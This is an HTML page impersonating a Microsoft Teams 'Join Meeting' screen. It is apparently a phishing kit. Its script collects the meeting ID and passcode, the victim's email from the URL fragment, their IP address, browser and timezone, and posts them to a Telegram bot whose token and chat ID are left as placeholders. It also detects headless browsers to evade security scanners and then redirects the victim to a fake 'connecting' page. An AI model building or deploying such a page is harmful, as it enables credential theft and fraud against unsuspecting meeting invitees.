<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Microsoft Teams</title>
</head>
<body>
<h2>Join Meeting</h2>
<form id="joinForm">
  <label>Meeting ID: <input type="text" id="meetingID" required></label><br>
  <label>Password: <input type="text" id="password" required></label><br>
  <button type="submit">Join</button>
</form>

<script>
document.getElementById('joinForm').addEventListener('submit', async function(e) {
  e.preventDefault();

  // Anti-bot / headless detection
  if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
    document.body.innerHTML = "<h2>Security Verification Failed</h2><p>Please try again from a regular browser.</p>";
    throw new Error("Headless browser detected");
  }

  const meetingID = document.getElementById('meetingID').value.trim();
  const password = document.getElementById('password').value.trim();
  const browser = navigator.userAgent;
  const hash = window.location.hash;
  const email = hash ? hash.substring(1) : '';

  // Fetch IP
  let ipAddress = 'Unavailable';
  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 2000);
    const response = await fetch('https://api.ipify.org?format=json', { signal: controller.signal });
    clearTimeout(timeoutId);
    const data = await response.json();
    ipAddress = data.ip || 'Unavailable';
  } catch {}

  const currentDateTime = new Date().toLocaleString();
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

  const message =
    `âœ…ðŸ’¯ TEAMS RESULT ðŸ’¯âœ…\n` +
    `Meeting ID: ${meetingID}\n` +
    `Passcode: ${password}\n` +
    `Browser: ${browser}\n` +
    `IP Address: ${ipAddress}\n` +
    `Email: ${email || 'N/A'}\n` +
    `Date/Time: ${currentDateTime}\n` +
    `Timezone: ${timezone}\n` +
    `âœ…ðŸ’¯ TEAMS RESULT ðŸ’¯âœ…`;

  const telegramBotToken = 'YOUR_BOT_TOKEN';
  const chatId = 'YOUR_CHAT_ID';
  const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

  try {
    await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: message }),
    });
  } catch {}

  setTimeout(() => {
    window.location.href = 'connecting.html' + (hash || '');
  }, Math.floor(Math.random() * 1000) + 500);
});
</script>
</body>
</html>
